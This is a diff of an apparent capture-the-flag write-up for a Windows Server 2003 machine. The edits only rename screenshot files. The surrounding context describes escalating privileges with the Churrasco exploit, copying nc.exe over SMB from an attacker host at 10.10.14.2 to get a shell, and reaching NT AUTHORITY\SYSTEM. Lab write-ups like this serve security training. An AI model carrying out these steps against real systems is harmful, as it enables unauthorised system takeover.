@@ -152,7 +152,7 @@ We check our privileges and system structure:
 whoami
 ```
 
-![whoami](screenshots/whoami.png)
+![whoami](screenshots/users.png)
 
 On Windows Server 2003, user profiles are located in **`Documents and Settings`** instead of `Users`:
 
@@ -196,7 +196,7 @@ Move to `Temp` directory if copying fails.
 
 Running without arguments fails, so we must specify a command:
 
-![execute_churrasco](screenshots/execute_churrasco.png)
+![execute_churrasco](screenshots/execute%20churrasco.png)
 
 To get a more stable shell, we upload `nc.exe` via SMB and then execute it with Churrasco:
 
@@ -211,7 +211,7 @@ If it fails, try renaming the share or copying locally:
 copy "\\10.10.14.2\smb\nc.exe" nc.exe
 ```
 
-![whoami_churrasco](screenshots/whoami_churrasco.png)
+![whoami_churrasco](screenshots/root_user_flag.png)
 
 âœ… Privilege escalation successful â€“ we are `NT AUTHORITY\SYSTEM`.
 
